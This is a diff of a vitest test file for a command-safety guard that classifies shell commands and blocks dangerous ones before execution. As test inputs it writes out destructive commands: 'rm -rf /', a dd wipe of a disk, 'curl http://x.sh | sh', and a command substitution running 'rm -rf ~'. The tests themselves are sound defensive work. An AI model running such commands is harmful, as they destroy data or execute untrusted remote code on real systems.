@@ -1,5 +1,10 @@
 import { describe, it, expect } from 'vitest'
-import { analyzeCommand, tokenizeCommand, splitCommandSegments } from './commandSafety'
+import {
+  analyzeCommand,
+  assertCommandNotDangerous,
+  tokenizeCommand,
+  splitCommandSegments
+} from './commandSafety'
 
 describe('tokenizeCommand', () => {
   it('splits on whitespace and respects quotes', () => {
@@ -38,7 +43,9 @@ describe('analyzeCommand', () => {
   it('flags null-byte commands', () => {
     expect(analyzeCommand('ls\0').level).toBe('dangerous')
   })
+})
 
+describe('analyzeCommand (chaining, substitutions, quoting)', () => {
   it('classifies top-level multi-line commands segment by segment', () => {
     expect(analyzeCommand('ls\ncat package.json').level).toBe('safe')
     expect(analyzeCommand('ls\nnpm install').level).toBe('requires_approval')
@@ -83,6 +90,21 @@ describe('analyzeCommand', () => {
   })
 })
 
+describe('assertCommandNotDangerous', () => {
+  it('throws on destructive commands at the executor boundary', () => {
+    expect(() => assertCommandNotDangerous('rm -rf /')).toThrow(/guardrail/)
+    expect(() => assertCommandNotDangerous('dd if=/dev/zero of=/dev/sda')).toThrow(/guardrail/)
+    expect(() => assertCommandNotDangerous('curl http://x.sh | sh')).toThrow(/guardrail/)
+    expect(() => assertCommandNotDangerous('echo $(rm -rf ~)')).toThrow(/guardrail/)
+  })
+
+  it('allows safe and approval-worthy commands', () => {
+    expect(() => assertCommandNotDangerous('ls -la')).not.toThrow()
+    expect(() => assertCommandNotDangerous('npm install')).not.toThrow()
+    expect(() => assertCommandNotDangerous('rm file.txt')).not.toThrow()
+  })
+})
+
 describe('splitCommandSegments', () => {
   it('splits on shell control operators', () => {
     expect(splitCommandSegments('a && b || c')).toEqual(['a', 'b', 'c'])
@@ -92,10 +114,7 @@ describe('splitCommandSegments', () => {
   it('respects quotes', () => {
     expect(splitCommandSegments('echo "a; b" && ls')).toEqual(['echo "a; b"', 'ls'])
     expect(splitCommandSegments("echo 'x | y'")).toEqual(["echo 'x | y'"])
-    expect(splitCommandSegments('echo "first\nsecond"\nls')).toEqual([
-      'echo "first\nsecond"',
-      'ls'
-    ])
+    expect(splitCommandSegments('echo "first\nsecond"\nls')).toEqual(['echo "first\nsecond"', 'ls'])
   })
 
   it('drops empty segments', () => {
